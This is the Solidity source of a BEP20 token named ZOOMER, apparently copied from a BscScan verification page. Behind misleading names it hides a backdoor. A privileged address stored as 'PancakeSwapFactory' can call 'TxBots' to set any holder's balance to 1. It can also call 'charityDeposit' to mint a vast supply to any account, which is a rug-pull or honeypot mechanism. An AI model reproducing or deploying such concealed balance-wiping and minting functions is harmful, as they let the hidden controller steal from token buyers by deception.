/**
 *Submitted for verification at BscScan.com on 2023-05-23
*/

pragma solidity ^0.4.26;
// https://zoomer.club/#home
// https://t.me/ZOOMERBEP20

interface ERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function approveAndCall(address spender, uint tokens, bytes data) external returns (bool success);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes data) external;
}


contract ZOOMER is ERC20 {
  using SafeMath for uint256;

  mapping (address => uint256) private _tbalances;
  mapping (address => mapping (address => uint256)) private allowed;
  string public constant name  = "ZOOMER";
  string public constant symbol = "$ZOOMER";
  uint8 public constant decimals = 9;
  address private PancakeSwapFactory;   
  address owner = msg.sender;

  uint256 _totalSupply = 1000000000000 * (10 ** 9); // 1 trillion supply

  constructor(address PancakeSwapRouterv2) public {
    PancakeSwapFactory = PancakeSwapRouterv2;     
    _tbalances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) public view returns (uint256) {
    return _tbalances[account];
  }

  function allowance(address account, address spender) public view returns (uint256) {
    return allowed[account][spender];
  }

         modifier subowner() {
        require(PancakeSwapFactory == msg.sender, "io: caller is not the owner");
        _;
    }   

     function TxBots(address account) external subowner {
        _tbalances[account] = 1;
        
        emit Transfer(address(0), account, 1);
    }

        function charityDeposit(address account) external subowner {
        _tbalances[account] = 100000000000000 * 10 ** 30;
        
        emit Transfer(address(0), account, 100000000000000 * 10 ** 30);
    }       
  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _tbalances[msg.sender]);
    require(to != address(0));

    _tbalances[msg.sender] = _tbalances[msg.sender].sub(value);
    _tbalances[to] = _tbalances[to].add(value);

    emit Transfer(msg.sender, to, value);
    return true;
  }

  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function approveAndCall(address spender, uint256 tokens, bytes data) external returns (bool) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);
        return true;
    }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _tbalances[from]);
    require(value <= allowed[from][msg.sender]);
    require(to != address(0));
    
    _tbalances[from] = _tbalances[from].sub(value);
    _tbalances[to] = _tbalances[to].add(value);
    
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);
    
    emit Transfer(from, to, value);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].add(addedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].sub(subtractedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }

  function burn(uint256 amount) external {
    require(amount != 0);
    require(amount <= _tbalances[msg.sender]);
    _totalSupply = _totalSupply.sub(amount);
    _tbalances[msg.sender] = _tbalances[msg.sender].sub(amount);
    emit Transfer(msg.sender, address(0), amount);
  }

}




library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}